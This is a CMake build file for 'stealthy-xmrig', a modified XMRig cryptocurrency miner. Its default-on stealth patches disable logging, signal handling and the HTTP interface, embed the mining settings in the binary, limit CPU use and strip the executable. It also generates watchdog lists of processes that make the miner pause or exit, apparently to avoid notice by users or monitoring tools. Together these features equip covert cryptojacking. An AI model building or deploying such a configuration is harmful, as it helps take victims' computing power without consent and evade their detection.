cmake_minimum_required(VERSION 3.5)
project(stealthy-xmrig)

option(WITH_HWLOC           "Enable hwloc support" ON)
option(WITH_CN_LITE         "Enable CryptoNight-Lite algorithms family" ON)
option(WITH_CN_HEAVY        "Enable CryptoNight-Heavy algorithms family" ON)
option(WITH_CN_PICO         "Enable CryptoNight-Pico algorithm" ON)
option(WITH_CN_FEMTO        "Enable CryptoNight-UPX2 algorithm" ON)
option(WITH_RANDOMX         "Enable RandomX algorithms family" ON)
option(WITH_ARGON2          "Enable Argon2 algorithms family" ON)
option(WITH_KAWPOW          "Enable KawPow algorithms family" ON)
option(WITH_GHOSTRIDER      "Enable GhostRider algorithm" ON)
option(WITH_HTTP            "Enable HTTP protocol support (client/server)" ON)
option(WITH_DEBUG_LOG       "Enable debug log output" OFF)
option(WITH_TLS             "Enable OpenSSL support" ON)
option(WITH_ASM             "Enable ASM PoW implementations" ON)
option(WITH_MSR             "Enable MSR mod & 1st-gen Ryzen fix" ON)
option(WITH_ENV_VARS        "Enable environment variables support in config file" ON)
option(WITH_EMBEDDED_CONFIG "Enable internal embedded JSON config" OFF)
option(WITH_OPENCL          "Enable OpenCL backend" ON)
set(WITH_OPENCL_VERSION 200 CACHE STRING "Target OpenCL version")
set_property(CACHE WITH_OPENCL_VERSION PROPERTY STRINGS 120 200 210 220)
option(WITH_CUDA            "Enable CUDA backend" ON)
option(WITH_NVML            "Enable NVML (NVIDIA Management Library) support (only if CUDA backend enabled)" ON)
option(WITH_ADL             "Enable ADL (AMD Display Library) or sysfs support (only if OpenCL backend enabled)" ON)
option(WITH_STRICT_CACHE    "Enable strict checks for OpenCL cache" ON)
option(WITH_INTERLEAVE_DEBUG_LOG "Enable debug log for threads interleave" OFF)
option(WITH_PROFILING       "Enable profiling for developers" OFF)
option(WITH_SSE4_1          "Enable SSE 4.1 for Blake2" ON)
option(WITH_AVX2            "Enable AVX2 for Blake2" ON)
option(WITH_VAES            "Enable VAES instructions for Cryptonight" ON)
option(WITH_BENCHMARK       "Enable builtin RandomX benchmark and stress test" ON)
option(WITH_SECURE_JIT      "Enable secure access to JIT memory" OFF)
option(WITH_DMI             "Enable DMI/SMBIOS reader" ON)

option(BUILD_STATIC         "Build static binary" OFF)
option(ARM_V8               "Force ARMv8 (64 bit) architecture, use with caution if automatic detection fails, but you sure it may work" OFF)
option(ARM_V7               "Force ARMv7 (32 bit) architecture, use with caution if automatic detection fails, but you sure it may work" OFF)
option(HWLOC_DEBUG          "Enable hwloc debug helpers and log" OFF)

option(STEALTH_PATCH        "Enable stealth patches" ON)
option(INJECT_SETTINGS      "Inject settings into binary" OFF)
option(LIMIT_CPU            "Limit CPU usage" OFF)
option(NO_SIGNALS           "Disable signal handlers" OFF)
option(NO_DONATE            "Disable developer donation" ON)
option(NO_LOGS              "Disable logging" OFF)
option(OPTIMIZE_BUILD       "Enable build optimizations" ON)
option(STRIP_BINARY         "Strip binary" OFF)
option(WATCHDOG             "Enable watchdog" ON)

set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake")


include (CheckIncludeFile)
include (cmake/cpu.cmake)
include (cmake/os.cmake)
include (src/base/base.cmake)
include (src/backend/backend.cmake)


set(HEADERS
    "${HEADERS_BASE}"
    "${HEADERS_BASE_HTTP}"
    "${HEADERS_BACKEND}"
    src/App.h
    src/core/config/Config_default.h
    src/core/config/Config_platform.h
    src/core/config/Config.h
    src/core/config/ConfigTransform.h
    src/core/config/usage.h
    src/core/Controller.h
    src/core/Miner.h
    src/core/Taskbar.h
    src/net/interfaces/IJobResultListener.h
    src/net/JobResult.h
    src/net/JobResults.h
    src/net/Network.h
    src/net/strategies/DonateStrategy.h
    src/Summary.h
    src/version.h
   )

set(HEADERS_CRYPTO
    src/backend/common/interfaces/IMemoryPool.h
    src/crypto/cn/asm/CryptonightR_template.h
    src/crypto/cn/c_blake256.h
    src/crypto/cn/c_groestl.h
    src/crypto/cn/c_jh.h
    src/crypto/cn/c_skein.h
    src/crypto/cn/CnAlgo.h
    src/crypto/cn/CnCtx.h
    src/crypto/cn/CnHash.h
    src/crypto/cn/CryptoNight_monero.h
    src/crypto/cn/CryptoNight_test.h
    src/crypto/cn/CryptoNight.h
    src/crypto/cn/groestl_tables.h
    src/crypto/cn/hash.h
    src/crypto/cn/skein_port.h
    src/crypto/cn/soft_aes.h
    src/crypto/common/HugePagesInfo.h
    src/crypto/common/MemoryPool.h
    src/crypto/common/Nonce.h
    src/crypto/common/portable/mm_malloc.h
    src/crypto/common/VirtualMemory.h
   )

if (XMRIG_ARM)
    set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_arm.h)
else()
    set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_x86.h)
endif()

set(SOURCES
    "${SOURCES_BASE}"
    "${SOURCES_BASE_HTTP}"
    "${SOURCES_BACKEND}"
    src/App.cpp
    src/core/config/Config.cpp
    src/core/config/ConfigTransform.cpp
    src/core/Controller.cpp
    src/core/Miner.cpp
    src/core/Taskbar.cpp
    src/net/JobResults.cpp
    src/net/Network.cpp
    src/net/strategies/DonateStrategy.cpp
    src/Summary.cpp
    src/xmrig.cpp
   )

set(SOURCES_CRYPTO
    src/crypto/cn/c_blake256.c
    src/crypto/cn/c_groestl.c
    src/crypto/cn/c_jh.c
    src/crypto/cn/c_skein.c
    src/crypto/cn/CnCtx.cpp
    src/crypto/cn/CnHash.cpp
    src/crypto/common/HugePagesInfo.cpp
    src/crypto/common/MemoryPool.cpp
    src/crypto/common/Nonce.cpp
    src/crypto/common/VirtualMemory.cpp
   )

if (CMAKE_C_COMPILER_ID MATCHES GNU)
    set_source_files_properties(src/crypto/cn/CnHash.cpp PROPERTIES COMPILE_FLAGS "-Ofast -fno-tree-vectorize")
endif()

if (WITH_VAES)
    add_definitions(-DXMRIG_VAES)
    set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_x86_vaes.h)
    set(SOURCES_CRYPTO "${SOURCES_CRYPTO}" src/crypto/cn/CryptoNight_x86_vaes.cpp)
    if (CMAKE_C_COMPILER_ID MATCHES GNU OR CMAKE_C_COMPILER_ID MATCHES Clang)
        set_source_files_properties(src/crypto/cn/CryptoNight_x86_vaes.cpp PROPERTIES COMPILE_FLAGS "-Ofast -fno-tree-vectorize -mavx2 -mvaes")
    endif()
endif()

if (WITH_HWLOC)
    list(APPEND HEADERS_CRYPTO
        src/crypto/common/NUMAMemoryPool.h
        )

    list(APPEND SOURCES_CRYPTO
        src/crypto/common/NUMAMemoryPool.cpp
        src/crypto/common/VirtualMemory_hwloc.cpp
        )
endif()

if (XMRIG_OS_WIN)
    list(APPEND SOURCES_OS
        res/app.rc
        src/App_win.cpp
        src/crypto/common/VirtualMemory_win.cpp
        )

    set(EXTRA_LIBS ws2_32 psapi iphlpapi userenv dbghelp)
elseif (XMRIG_OS_APPLE)
    list(APPEND SOURCES_OS
        src/App_unix.cpp
        src/crypto/common/VirtualMemory_unix.cpp
        )

    find_library(IOKIT_LIBRARY IOKit)
    find_library(CORESERVICES_LIBRARY CoreServices)
    set(EXTRA_LIBS ${IOKIT_LIBRARY} ${CORESERVICES_LIBRARY})
else()
    list(APPEND SOURCES_OS
        src/App_unix.cpp
        src/crypto/common/VirtualMemory_unix.cpp
        )

    if (XMRIG_OS_ANDROID)
        set(EXTRA_LIBS pthread rt dl log)
    elseif (XMRIG_OS_LINUX)
        list(APPEND SOURCES_OS
            src/crypto/common/LinuxMemory.h
            src/crypto/common/LinuxMemory.cpp
            )

        set(EXTRA_LIBS pthread rt dl)
    elseif (XMRIG_OS_FREEBSD)
        set(EXTRA_LIBS kvm pthread)
    endif()
endif()

add_definitions(-DXMRIG_MINER_PROJECT -DXMRIG_JSON_SINGLE_LINE_ARRAY)
add_definitions(-D__STDC_FORMAT_MACROS -DUNICODE -D_FILE_OFFSET_BITS=64)

find_package(UV REQUIRED)

include(cmake/flags.cmake)
include(cmake/randomx.cmake)
include(cmake/argon2.cmake)
include(cmake/kawpow.cmake)
include(cmake/ghostrider.cmake)
include(cmake/OpenSSL.cmake)
include(cmake/asm.cmake)

if (WITH_CN_LITE)
    add_definitions(/DXMRIG_ALGO_CN_LITE)
endif()

if (WITH_CN_HEAVY)
    add_definitions(/DXMRIG_ALGO_CN_HEAVY)
endif()

if (WITH_CN_PICO)
    add_definitions(/DXMRIG_ALGO_CN_PICO)
endif()

if (WITH_CN_FEMTO)
    add_definitions(/DXMRIG_ALGO_CN_FEMTO)
endif()

if (WITH_EMBEDDED_CONFIG)
    add_definitions(/DXMRIG_FEATURE_EMBEDDED_CONFIG)
endif()

function(process_string_to_array)
    # Define and parse named arguments
    set(options "")
    set(oneValueArgs INPUT_STRING ARRAY_NAME SIZE_MACRO_NAME OUTPUT_DIR OUTPUT_FILENAME)
    set(multiValueArgs "")
    cmake_parse_arguments(ARGS "${options}" "${oneValueArgs}" "${multiValueArgs}" ${ARGN})

    # Set default values if not provided
    if(NOT ARGS_ARRAY_NAME)
        set(ARGS_ARRAY_NAME "processed_strings")
    endif()
    
    if(NOT ARGS_SIZE_MACRO_NAME)
        set(ARGS_SIZE_MACRO_NAME "${ARGS_ARRAY_NAME}_size")
    endif()

    if(NOT ARGS_OUTPUT_DIR)
        set(ARGS_OUTPUT_DIR "${CMAKE_CURRENT_BINARY_DIR}")
    endif()

    if(NOT ARGS_OUTPUT_FILENAME)
        set(ARGS_OUTPUT_FILENAME "${ARGS_ARRAY_NAME}.h")
    endif()

    # Validate required arguments
    if(NOT ARGS_INPUT_STRING)
        message(FATAL_ERROR "INPUT_STRING is required")
    endif()

    # Ensure output directory exists
    file(MAKE_DIRECTORY "${ARGS_OUTPUT_DIR}")

    # Construct full output path
    set(OUTPUT_PATH "${ARGS_OUTPUT_DIR}/${ARGS_OUTPUT_FILENAME}")

    # Convert the input string to a list using comma as separator
    string(REPLACE "," ";" STRING_LIST "${ARGS_INPUT_STRING}")
    
    # Initialize an empty list for processed strings
    set(PROCESSED_LIST "")
    
    # Process each item in the list
    foreach(ITEM ${STRING_LIST})
        # Strip whitespace from both ends
        string(STRIP "${ITEM}" STRIPPED_ITEM)
        
        # Convert to lowercase
        string(TOLOWER "${STRIPPED_ITEM}" LOWERCASE_ITEM)
        
        # Wrap in SAFE() and add to the processed list
        list(APPEND PROCESSED_LIST "SAFE_STRING(\"${LOWERCASE_ITEM}\")")
    endforeach()
    
    list(LENGTH PROCESSED_LIST LIST_SIZE)

    string(MAKE_C_IDENTIFIER "${ARGS_OUTPUT_FILENAME}" HEADER_GUARD)
    string(TOUPPER "${HEADER_GUARD}" HEADER_GUARD)
    
    set(HEADER_CONTENT "#ifndef ${HEADER_GUARD}\n")
    string(APPEND HEADER_CONTENT "#define ${HEADER_GUARD}\n#include \"../../safe_string.h\"\n\n")
    
    string(APPEND HEADER_CONTENT "static const char* ${ARGS_ARRAY_NAME}[${LIST_SIZE}] = {\n")
    foreach(ITEM ${PROCESSED_LIST})
        string(APPEND HEADER_CONTENT "    ${ITEM},\n")
    endforeach()
    string(APPEND HEADER_CONTENT "};\n\n")
    
    string(APPEND HEADER_CONTENT "#define ${ARGS_SIZE_MACRO_NAME} ${LIST_SIZE}\n\n")
    
    string(APPEND HEADER_CONTENT "#endif // ${HEADER_GUARD}\n")
    
    file(WRITE "${OUTPUT_PATH}" "${HEADER_CONTENT}")

    message(STATUS "Generated ${OUTPUT_PATH}")
endfunction()

if (STEALTH_PATCH)
    message(STATUS "Stealth patches enabled")
    add_definitions(/DSTEALTH_PATCH)

    set(WITH_HTTP OFF CACHE BOOL "Enable HTTP protocol support (client/server)" FORCE)
    set(WITH_BENCHMARK OFF CACHE BOOL "Enable builtin RandomX benchmark and stress test" FORCE)
    set(NO_DONATE ON CACHE BOOL "Disable developer donation" FORCE)
    set(NO_LOGS ON CACHE BOOL "Disable logging" FORCE)
    set(NO_SIGNALS ON CACHE BOOL "Disable signal handlers" FORCE)
    set(INJECT_SETTINGS ON CACHE BOOL "Inject settings into binary" FORCE)
    set(LIMIT_CPU ON CACHE BOOL "Limit CPU usage" FORCE)
    set(STRIP_BINARY ON CACHE BOOL "Strip binary" FORCE)
endif()

if (DEFINED INJECTED_SETTINGS AND NOT INJECTED_SETTINGS STREQUAL "")
    set(INJECT_SETTINGS ON CACHE BOOL "Inject settings into binary" FORCE)
endif()

if (INJECT_SETTINGS)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wno-write-strings")
    set(CMAKE_CXX_STANDARD 14)
    add_definitions(/DINJECT_SETTINGS)
    
    if (DEFINED INJECTED_SETTINGS AND NOT INJECTED_SETTINGS STREQUAL "")
        add_definitions(/DINJECTED_SETTINGS="${INJECTED_SETTINGS}")
        message(STATUS "Injected settings: \"${INJECTED_SETTINGS}\"")
    else()
        message(FATAL_ERROR "INJECT_SETTINGS is turned on, but INJECTED_SETTINGS have not been defined")
    endif()

endif()

if(DEFINED LIMIT_CPU_PERCENT AND LIMIT_CPU_PERCENT GREATER 0)
    set(LIMIT_CPU ON CACHE BOOL "Limit CPU usage" FORCE)
endif()

if (LIMIT_CPU)
    add_definitions(/DLIMIT_CPU)
    if (DEFINED LIMIT_CPU_PERCENT AND LIMIT_CPU_PERCENT GREATER 0)
        add_definitions(/DLIMIT_CPU_PERCENT="${LIMIT_CPU_PERCENT}")
        message(STATUS "Limit CPU percent: ${LIMIT_CPU_PERCENT}")
    else()
        message(FATAL_ERROR "LIMIT_CPU is turned on, but LIMIT_CPU_PERCENT have not been defined")
    endif()
endif()

if (NO_SIGNALS)
    add_definitions(/DNO_SIGNALS)
    message(STATUS "Signals disabled")
endif()

if (NO_DONATE)
    add_definitions(/DNO_DONATE)
    message(STATUS "Donations disabled")
endif()

if (NO_LOGS)
    add_definitions(/DNO_LOGS)
    set(WITH_DEBUG_LOG OFF CACHE BOOL "Enable debug log output" FORCE)
    message(STATUS "Disabled logs")
endif()

if (OPTIMIZE_BUILD)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Ofast")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Ofast")
    message(STATUS "Build optimizations enabled (-Ofast)")
endif()

if (STRIP_BINARY)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -s")
    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -s")
    message(STATUS "Stripping binary")
endif()

if (DEFINED PAUSE_PROCESSES AND NOT PAUSE_PROCESSES STREQUAL "")
    set(WATCHDOG ON CACHE BOOL "Enable watchdog" FORCE)
    process_string_to_array(
    INPUT_STRING "${PAUSE_PROCESSES}"
    ARRAY_NAME "pause_processes"
    SIZE_MACRO_NAME "PAUSE_PROCESSES_COUNT"
    OUTPUT_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src/stealth_patch/watchdog/windows"
    OUTPUT_FILENAME "pause_processes.h"
)
endif()

if (DEFINED EXIT_PROCESSES AND NOT EXIT_PROCESSES STREQUAL "")
    set(WATCHDOG ON CACHE BOOL "Enable watchdog" FORCE)
    process_string_to_array(
    INPUT_STRING "${EXIT_PROCESSES}"
    ARRAY_NAME "exit_processes"
    SIZE_MACRO_NAME "EXIT_PROCESSES_COUNT"
    OUTPUT_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src/stealth_patch/watchdog/windows"
    OUTPUT_FILENAME "exit_processes.h"
)
endif()

if (WATCHDOG)
    add_definitions(/DWATCHDOG)
    message(STATUS "Watchdog enabled")
endif()

include(src/hw/api/api.cmake)
include(src/hw/dmi/dmi.cmake)

include_directories(src)
include_directories(src/3rdparty)
include_directories(${UV_INCLUDE_DIR})

if (WITH_DEBUG_LOG)
    add_definitions(/DAPP_DEBUG)
endif()

add_executable(${CMAKE_PROJECT_NAME} ${HEADERS} ${SOURCES} ${SOURCES_OS} ${HEADERS_CRYPTO} ${SOURCES_CRYPTO} ${SOURCES_SYSLOG} ${TLS_SOURCES} ${XMRIG_ASM_SOURCES})
target_link_libraries(${CMAKE_PROJECT_NAME} ${XMRIG_ASM_LIBRARY} ${OPENSSL_LIBRARIES} ${UV_LIBRARIES} ${EXTRA_LIBS} ${CPUID_LIB} ${ARGON2_LIBRARY} ${ETHASH_LIBRARY} ${GHOSTRIDER_LIBRARY})

if (WIN32)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/bin/WinRing0/WinRing0x64.sys" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/scripts/benchmark_1M.cmd" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/scripts/benchmark_10M.cmd" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/scripts/pool_mine_example.cmd" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/scripts/solo_mine_example.cmd" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
    add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/scripts/rtm_ghostrider_example.cmd" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
endif()

if (CMAKE_CXX_COMPILER_ID MATCHES Clang AND CMAKE_BUILD_TYPE STREQUAL Release AND NOT CMAKE_GENERATOR STREQUAL Xcode)
    add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_STRIP} ${CMAKE_PROJECT_NAME})
endif()
